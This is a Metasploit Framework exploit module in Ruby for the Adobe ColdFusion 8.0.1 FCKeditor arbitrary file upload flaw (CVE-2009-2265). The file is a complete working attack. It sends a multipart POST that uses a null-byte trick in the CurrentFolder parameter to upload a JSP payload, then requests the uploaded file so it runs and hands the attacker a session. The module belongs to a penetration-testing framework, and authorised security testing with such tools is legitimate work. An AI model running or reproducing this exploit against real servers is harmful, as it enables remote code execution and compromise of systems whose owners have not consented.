##
# $Id: coldfusion_fckeditor.rb 11127 2010-11-24 19:35:38Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'ColdFusion 8.0.1 Arbitrary File Upload and Execute',
			'Description'    => %q{
					This module exploits the Adobe ColdFusion 8.0.1 FCKeditor 'CurrentFolder' File Upload
				and Execute vulnerability.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 11127 $',
			'Platform'       => 'win',
			'Privileged'     => true,
			'References'     =>
				[
					[ 'CVE', '2009-2265' ],
					[ 'OSVDB', '55684'],
				],
			'Targets'        =>
				[
					[ 'Universal Windows Target',
						{
							'Arch'     => ARCH_JAVA,
							'Payload'  =>
								{
									'DisableNops' => true,
								},
						}
					],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jul 3 2009'
		))

		register_options(
			[
				Opt::RPORT(80),
				OptString.new('FCKEDITOR_DIR', [ false, 'The path to upload.cfm ', '/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm' ]),
			], self.class )
	end

	def exploit

		page  = rand_text_alpha_upper(rand(10) + 1) + ".jsp"

		dbl = Rex::MIME::Message.new
		dbl.add_part(payload.encoded, "application/x-java-archive", nil, "form-data; name=\"newfile\"; filename=\"#{rand_text_alpha_upper(8)}.txt\"")
		file = dbl.to_s
		file.strip!

		print_status("Sending our POST request...")

		res = send_request_cgi(
			{
				'uri'		=> "#{datastore['FCKEDITOR_DIR']}",
				'query'		=> "Command=FileUpload&Type=File&CurrentFolder=/#{page}%00",
				'version'	=> '1.1',
				'method'	=> 'POST',
				'ctype'		=> 'multipart/form-data; boundary=' + dbl.bound,
				'data'		=> file,
			}, 5)

		if ( res and res.code == 200 and res.body =~ /OnUploadCompleted/ )
			print_status("Upload succeeded! Executing payload...")

			send_request_raw(
				{
					# default path in Adobe ColdFusion 8.0.1.
					'uri'		=> '/userfiles/file/' + page,
					'method'	=> 'GET',
				}, 5)

			handler
		else
			print_error("Upload Failed...")
			return
		end

	end
end
